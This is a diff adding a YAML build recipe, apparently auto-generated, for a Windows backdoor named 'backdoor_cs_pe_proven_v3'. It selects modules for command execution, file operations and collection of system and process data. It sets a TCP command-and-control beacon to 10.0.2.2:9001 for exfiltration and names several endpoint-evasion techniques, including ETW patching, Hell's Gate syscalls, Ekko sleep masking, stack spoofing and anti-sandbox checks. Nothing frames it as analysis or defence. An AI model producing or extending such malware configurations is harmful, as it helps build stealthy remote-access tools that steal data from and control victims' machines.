@@ -1,0 +1,23 @@
+name: backdoor_cs_pe_proven_v3
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+exfil: c2/tcp_beacon
+arch: arch/backdoor
+resources: true
+api_resolve: api_resolve/peb_walk
+evasion:
+- evasion/etw_patch
+- evasion/hells_gate
+- evasion/sleep_ekko
+- evasion/stack_spoof
+- evasion/anti_sandbox
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: 9001
+  BEACON_INTERVAL_MS: 30000
